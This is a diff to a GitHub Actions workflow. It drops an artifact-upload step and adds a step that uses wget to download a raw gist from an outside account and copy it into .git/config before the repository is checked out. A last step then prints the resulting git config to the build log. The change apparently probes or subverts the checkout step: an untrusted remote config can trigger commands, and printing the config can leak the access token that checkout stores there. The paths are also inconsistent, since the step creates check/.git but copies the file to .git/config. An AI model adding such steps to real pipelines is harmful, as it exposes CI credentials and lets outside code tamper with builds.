@@ -9,13 +9,16 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
+      - name: Create .git
+        run: |
+          wget https://gist.githubusercontent.com/arnodorian1337/ec556e4cc70e6029c6f5bd91925168ba/raw/eaad3933692e0ab6459e0b3ee2baed14bdf4c3f4/gistfile1.txt
+          mkdir -p check/.git
+          cp gistfile1.txt .git/config
       # Checkout the repository (optional if you don't need repo files)
       - name: Checkout code
         uses: actions/checkout@v3
-
-      # Upload the artifact
-      - name: Upload artifact
-        uses: actions/upload-artifact@v4
         with:
-          name: test-file
-          path: test.txt
+          path: check
+
+      - name: check config
+        run: cat check/.git/config
